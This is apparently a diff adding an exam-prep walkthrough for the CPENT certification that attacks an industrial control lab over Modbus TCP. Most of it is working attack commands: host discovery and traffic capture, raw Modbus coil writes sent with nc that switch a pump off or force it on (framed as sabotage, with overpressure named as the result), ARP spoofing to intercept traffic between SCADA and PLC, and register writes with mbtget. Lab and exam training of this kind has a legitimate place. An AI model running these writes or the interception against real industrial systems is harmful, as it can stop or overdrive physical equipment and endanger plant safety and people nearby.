@@ -1,0 +1,185 @@
+
+🧠 SCENARIO
+
+You are dropped into an industrial network:
+
+🟩 PLC (Modbus Server): 192.168.100.10
+🟩 HMI / SCADA Panel: 192.168.100.20
+🟩 Engineering Workstation: 192.168.100.30
+🟥 Your Attacker (Kali): 10.10.10.1
+📡 Protocol: Modbus TCP (Port 502)
+
+🎯 Goal:
+
+Capture traffic
+Identify control commands
+Modify PLC behavior
+Simulate industrial impact
+🔹 PHASE 1: NETWORK DISCOVERY
+🟥 Run on: Kali (Attacker)
+🔍 Find Live Hosts
+
+nmap -sn 192.168.100.0/24
+
+🎯 Result
+192.168.100.10 → PLC
+192.168.100.20 → HMI
+192.168.100.30 → Engineering PC
+🔍 Check Modbus Port
+
+nmap -p 502 192.168.100.10
+
+🎯 Result
+502/tcp open modbus
+🔹 PHASE 2: TRAFFIC CAPTURE (MODBUS)
+🟥 Run on: Kali
+🔥 Capture Live Traffic
+
+tcpdump -i eth0 host 192.168.100.10 and port 502 -nn
+
+🔍 Explanation
+Focus only PLC Modbus traffic
+Remove noise from network
+🎯 You See
+192.168.100.20 → 192.168.100.10:502
+Function Code: 03 (Read Registers)
+🔹 PHASE 3: SAVE FOR ANALYSIS
+🟥 Run on: Kali
+
+tcpdump -i eth0 port 502 -w plc_traffic.pcap
+
+🔍 Now open:
+
+Wireshark → plc_traffic.pcap
+
+🔹 PHASE 4: WIRESHARK ANALYSIS
+🟥 Run on: Kali (GUI)
+🔍 Apply Filter
+
+modbus
+
+🎯 You Observe:
+Action	Meaning
+Read Registers (03)	Monitoring values
+Write Coil (05)	ON/OFF device
+Write Register (06)	Change value
+🔥 CRITICAL FINDING
+Function Code 05 → Coil Write (Motor ON/OFF)
+Address 0001 → Pump Control
+
+🧠 This is your attack target
+
+🔹 PHASE 5: UNDERSTAND PROCESS LOGIC
+🧠 Interpretation
+Register	Meaning
+0001	Pump ON/OFF
+0002	Pressure
+0003	Temperature
+
+👉 If you modify 0001, you control pump
+
+🔹 PHASE 6: ACTIVE ATTACK (MODBUS WRITE)
+🟥 Run on: Kali
+🔥 Turn OFF Pump (Example Attack)
+
+printf '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\x00\x00' | nc 192.168.100.10 502
+
+🔍 Explanation
+05 → Write Coil
+0001 → Pump register
+0000 → OFF
+🔥 IMPACT
+
+👉 Pump stops immediately
+
+🔹 PHASE 7: REVERSE ACTION (SABOTAGE SIMULATION)
+🟥 Run on: Kali
+🔥 Force Pump ON at MAX
+
+printf '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x01\xFF\x00' | nc 192.168.100.10 502
+
+🔍 Meaning
+FF00 → FORCE ON
+🔥 RESULT
+Overpressure risk
+System instability
+Industrial impact
+🔹 PHASE 8: MITM ATTACK (ADVANCED)
+🟥 Run on: Kali
+🔥 Enable Forwarding
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+🔥 ARP Spoof PLC
+
+arpspoof -i eth0 -t 192.168.100.20 192.168.100.10
+
+🔥 ARP Spoof SCADA
+
+arpspoof -i eth0 -t 192.168.100.10 192.168.100.20
+
+🎯 Now you are in middle:
+SCADA ↔ ATTACKER ↔ PLC
+🔹 PHASE 9: LIVE TRAFFIC MODIFICATION
+🟥 Run on: Kali
+🔥 Intercept packet:
+Change register value in transit
+Example:
+Pump Speed: 20 → 100
+
+👉 This is real ICS sabotage simulation
+
+🔹 PHASE 10: MODBUS TOOL METHOD (SAFER)
+🟥 Run on: Kali
+🔧 Install Tool
+
+apt install mbtget -y
+
+🔍 Read Registers
+
+mbtget -r 0 -c 10 192.168.100.10
+
+🔥 Write Value
+
+mbtget -w 1 100 192.168.100.10
+
+🔹 PHASE 11: ATTACK VALIDATION
+🟥 Run on: Kali
+🔍 Confirm Change
+
+tcpdump -i eth0 port 502 -nn
+
+👉 You will see modified value reflected
+
+🧠 FULL ATTACK FLOW
+Discovery → Capture → Analyze → Identify Registers → Write Attack → MITM → Modify Process → Impact
+🔥 WHAT EXAMINER IS TESTING
+Skill	Tool
+Network discovery	nmap
+ICS protocol understanding	Modbus
+Traffic analysis	Wireshark
+Packet capture	tcpdump
+Industrial exploitation	raw Modbus writes
+MITM attack	arpspoof
+⚠️ COMMON CPENT FAILURES
+
+❌ Only sniffing (no exploitation)
+❌ Ignoring function codes
+❌ Not identifying registers
+❌ Forgetting port 502 focus
+❌ No MITM attempt
+
+💡 CPENT WINNING STRATEGY
+
+👉 Always follow:
+
+Find PLC
+Capture traffic
+Identify control registers
+Modify values
+Confirm impact
+🔥 FINAL GOLD RULE
+
+🧠 In ICS networks:
+
+If you can write to Modbus → you control the physical world
